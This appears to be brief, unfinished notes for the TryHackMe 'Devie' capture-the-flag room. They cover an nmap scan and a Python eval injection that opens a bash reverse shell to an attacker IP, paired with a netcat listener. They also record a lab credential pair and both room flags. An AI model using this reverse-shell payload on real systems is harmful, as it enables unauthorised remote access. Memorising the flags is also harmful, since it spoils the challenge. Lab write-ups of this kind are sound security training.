# Room Name – Devie

> Difficulty: Medium
> Platform: TryHackMe  
> Focus: eval vulnerability , privilage escalation,

---

## Objective

A developer has asked you to do a vulnerability check on their system.

---

## Reconnaissance & Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.49.131.26


## Notes
eval vulnerability
```bash
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.49.107.222/4444 0>&1"')
```
nc -nlvp 4444

cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

## credentials
gordon:G0th@mR0ckz!

## Flags
1.THM{Car3ful_witH_3v@l}
2.THM{X0R_XoR_XOr_xOr}